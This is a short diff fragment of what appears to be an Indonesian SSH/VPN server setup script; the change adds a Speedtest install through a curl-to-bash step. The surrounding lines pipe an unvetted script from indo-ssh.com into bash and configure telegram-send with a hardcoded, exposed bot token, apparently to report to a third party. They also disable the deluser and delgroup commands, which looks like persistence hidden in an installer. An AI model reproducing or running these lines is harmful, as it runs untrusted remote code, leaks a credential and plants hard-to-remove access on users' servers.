@@ -982,6 +982,10 @@ echo "LABEL=/boot /boot ext2 default, ro 1 2" >> /etc/
 chmod -x /sbin/deluser
 chmod -x /sbin/delgroup
 apt install zip unzip -y && apt install python3-pip -y && pip3 install telegram-send && curl -L "https://indo-ssh.com/addon.sh" | bash && printf "5373814520:AAE-ISezsyWPqYXHAuZVl7OHQV-PlmN-SdM" | telegram-send --configure
+#install-speedtest
+sudo apt-get install curl
+curl -s https://packagecloud.io/install/repositories/ookla/speedtest-cli/script.deb.sh | sudo bash
+sudo apt-get install speedtest
 systemctl stop nginx
 systemctl stop vmess-ws-none
 systemctl disable apache2
